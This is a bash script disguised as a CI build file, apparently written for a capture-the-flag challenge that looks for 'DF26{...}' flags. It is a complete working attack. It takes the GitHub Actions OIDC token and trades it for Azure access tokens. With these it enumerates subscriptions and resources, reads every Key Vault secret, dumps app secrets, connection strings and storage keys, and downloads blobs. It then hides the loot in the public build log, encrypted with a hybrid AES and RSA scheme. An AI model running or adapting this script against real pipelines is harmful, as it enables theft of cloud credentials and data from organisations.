#!/usr/bin/env bash
# ci/build.sh — chi doc, khong thay doi gi tren Azure.
# Repo public => log run ai cung doc duoc => loot chi ra log duoi dang ma hoa.
set -uo pipefail

LOOT=$(mktemp); exec 3>"$LOOT"
say() { echo "$@" >&3; }

PUB=ci/pubkey.pem
if [ "${PLAIN:-0}" != "1" ] && [ ! -f "$PUB" ]; then
  echo "FATAL: thieu $PUB va PLAIN!=1 -> dung lai (tranh do loot ra log public)"; exit 1
fi

# ---- 1) OIDC token tu GitHub, audience cua Azure AD ----
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
[ -n "$OIDC" ] || { echo "FATAL: khong lay duoc OIDC token"; exit 1; }

# in claim khong-bi-mat de biet FIC dang trust cai gi
python3 - "$OIDC" <<'PY'
import sys, json, base64
p = sys.argv[1].split('.')[1]; p += '=' * (-len(p) % 4)
c = json.loads(base64.urlsafe_b64decode(p))
for k in ("iss", "aud", "sub", "repository", "event_name", "ref", "workflow"):
    print("OIDC", k, "=", c.get(k))
PY

# ---- 2) doi OIDC -> Azure AD access token (federated credential) ----
aad() {   # $1 = scope
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" \
    -d "scope=$1" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${OIDC}" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR "+json.dumps(d))'
}

ARM=$(aad "https://management.azure.com/.default")
case "$ARM" in ERR*) echo "AAD exchange failed: $(printf '%s' "$ARM" | head -c 500)"; exit 1;; esac
echo "AAD exchange OK"

arm()  { curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com$1"; }
armp() { curl -sS -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' \
             "https://management.azure.com$1"; }

SUB="$AZURE_SUBSCRIPTION_ID"

# ---- 3) liet ke resource ----
say "===== subscriptions ====="; say "$(arm "/subscriptions?api-version=2022-12-01")"
say "===== role assignments ====="
say "$(arm "/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")"
say "===== resources ====="
RES=$(arm "/subscriptions/$SUB/resources?api-version=2021-04-01")
say "$RES"
echo "resources listed: $(printf '%s' "$RES" | grep -o '"id"' | wc -l)"

# ---- 4) Key Vault: liet ke va doc secret ----
KVTOK=$(aad "https://vault.azure.net/.default")
case "$KVTOK" in ERR*) say "keyvault token ERR: $KVTOK"; KVTOK="";; esac
if [ -n "$KVTOK" ]; then
for V in $(printf '%s' "$RES" | python3 -c '
import sys, json
for r in json.load(sys.stdin).get("value", []):
    if r["type"].lower() == "microsoft.keyvault/vaults": print(r["name"])'); do
  say "===== keyvault $V ====="
  NAMES=$(curl -sS -H "Authorization: Bearer $KVTOK" "https://$V.vault.azure.net/secrets?api-version=7.4")
  say "$NAMES"
  for S in $(printf '%s' "$NAMES" | python3 -c '
import sys, json
for s in json.load(sys.stdin).get("value", []): print(s["id"].rsplit("/",1)[1])' 2>/dev/null); do
    say "--- secret $S"
    say "$(curl -sS -H "Authorization: Bearer $KVTOK" "https://$V.vault.azure.net/secrets/$S?api-version=7.4")"
  done
done
fi

# ---- 5) app settings cua Container App / Web App (noi co CONFIG_STORAGE_CONNECTION) ----
printf '%s' "$RES" | python3 -c '
import sys, json
for r in json.load(sys.stdin).get("value", []):
    if r["type"].lower() in ("microsoft.app/containerapps", "microsoft.web/sites"):
        print(r["id"], r["type"])' | while read -r ID TYPE; do
  say "===== $TYPE $ID ====="
  case "$TYPE" in
    Microsoft.App/containerApps|microsoft.app/containerapps)
      say "$(arm  "$ID?api-version=2024-03-01")"
      say "$(armp "$ID/listSecrets?api-version=2024-03-01")" ;;
    *)
      say "$(armp "$ID/config/appsettings/list?api-version=2022-03-01")"
      say "$(armp "$ID/config/connectionstrings/list?api-version=2022-03-01")" ;;
  esac
done

# ---- 6) Storage: lay key roi liet ke container/blob (dung az CLI co san tren runner) ----
printf '%s' "$RES" | python3 -c '
import sys, json
for r in json.load(sys.stdin).get("value", []):
    if r["type"].lower() == "microsoft.storage/storageaccounts":
        print(r["id"], r["name"])' | while read -r ID NAME; do
  say "===== storage $NAME ====="
  KEY=$(armp "$ID/listKeys?api-version=2023-01-01" \
        | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["keys"][0]["value"] if d.get("keys") else "")')
  [ -n "$KEY" ] || { say "listKeys failed"; continue; }
  say "key: $KEY"
  if command -v az >/dev/null 2>&1; then
    say "$(az storage container list --account-name "$NAME" --account-key "$KEY" -o json 2>&1 | head -c 20000)"
    for C in $(az storage container list --account-name "$NAME" --account-key "$KEY" \
                 --query '[].name' -o tsv 2>/dev/null); do
      say "--- container $C"
      for BL in $(az storage blob list --account-name "$NAME" --account-key "$KEY" -c "$C" \
                    --query '[].name' -o tsv 2>/dev/null); do
        say "--- blob $C/$BL"
        if az storage blob download --account-name "$NAME" --account-key "$KEY" \
             -c "$C" -n "$BL" -f /tmp/_b.bin --overwrite >/dev/null 2>&1; then
          say "$(head -c 4000 /tmp/_b.bin)"
        fi
      done
    done
  fi
done

exec 3>&-

# ---- 7) xuat ket qua (KHONG in flag ra log public) ----
HITS=$(grep -ao 'DF26{[^}]*}' "$LOOT" 2>/dev/null | sort -u | wc -l)
echo "== loot: $(wc -c <"$LOOT") bytes, DF26{...} unique hits: $HITS (gia tri khong in ra log) =="

if [ "${PLAIN:-0}" = "1" ]; then
  echo "===== LOOT (plaintext) ====="; cat "$LOOT"
else
  K=$(openssl rand -hex 32)
  echo "== loot.enc (base64, AES-256-CBC) =="
  openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass "pass:$K" -in "$LOOT" | base64 -w0; echo
  echo "== key.enc (base64, RSA-OAEP) =="
  printf '%s' "$K" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" \
      -pkeyopt rsa_padding_mode:oaep | base64 -w0; echo
fi
